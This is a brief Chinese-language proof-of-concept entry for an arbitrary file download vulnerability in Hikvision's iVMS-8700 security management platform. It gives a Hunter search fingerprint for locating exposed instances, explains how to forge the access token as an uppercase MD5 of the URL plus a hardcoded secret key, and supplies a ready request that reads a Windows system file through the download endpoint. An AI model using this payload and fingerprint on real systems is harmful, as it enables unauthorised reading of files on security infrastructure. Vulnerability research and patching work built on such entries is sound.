# 海康威视iVMS-8700综合安防管理平台download任意文件下载

- **系统**：海康　|　**类型**：其他　|　**CVE**：—
- **指纹**：`hunter：`app.name=="Hikvision 海康威视 iVMS"``

**请求体 / payload**
```
poc，token为`url+secretKeyIbuilding`进行MD5加密（**32位大写**）
/eps/api/triggerSnapshot/download?token=xxx&fileUrl=file:///C:/windows/win.ini&fileName=1

```

**其他**
- 海康威视 iVMS-8700综合安防管理平台 download 任意文件下载: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * HIKVISION iVMS-8700综合安防管理平台